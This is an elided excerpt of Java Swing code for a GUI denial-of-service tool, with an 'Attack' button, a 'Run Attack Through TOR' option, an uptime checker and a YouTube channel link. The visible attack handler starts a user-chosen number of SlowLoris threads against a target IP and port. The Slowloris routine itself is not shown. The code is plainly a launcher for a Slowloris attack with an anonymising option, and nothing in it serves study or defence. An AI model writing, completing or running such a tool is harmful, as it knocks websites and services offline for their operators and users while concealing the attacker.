...
private JButton jButton1;
  ...
  private void initComponents()
  {
    ...
    this.jCheckBox1.setText("Run Attack Through TOR");
    
    this.jButton1.setText("Attack");
    ...
    this.jButton3.setText("Check Uptime");
    ...
    this.jLabel5.setText("https://www.youtube.com/TemporizeUS");
    this.jLabel5.addMouseListener(new MouseAdapter()
    {
      public void mouseClicked(MouseEvent evt)
      {
    	  Main.this.jLabel5MouseClicked(evt);
      }
    });
  ...
  private void jButton1ActionPerformed(ActionEvent evt)
  {
    ...
    for (int k = 0; k < a; k++) {
      new Thread(new SlowLoris(ip, port, b, this.jCheckBox1.isSelected())).start();
    }
  }
